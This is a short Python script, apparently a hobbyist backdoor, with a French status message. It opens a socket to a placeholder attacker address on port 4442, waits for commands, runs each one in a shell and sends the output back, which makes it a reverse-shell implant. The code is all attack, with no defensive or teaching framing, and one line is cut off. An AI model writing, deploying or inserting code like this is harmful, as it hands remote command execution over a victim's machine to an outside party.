import os
import socket
import subprocess


server_ip = 'yourIp'
port = 4442
backdoor = socket.socket()
backdoor.connect((server_ip, port))

while True:
    command = backdoor.recv(1024)
    command = command.decode()
    print(command)
    if command.split(" ")[0] == "cd" :
        os.chdir(command.split(" ")[1])
        backdoor.send("Change Directory {}".format(os.getcwd()).encode())
    else:
        op = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE, stdo>
        output = op.stdout.read()
        output_error = op.stderr.read()
        if output == "b''" :
                backdoor.send("dossier vide")
        else:
                backdoor.send(output + output_error)
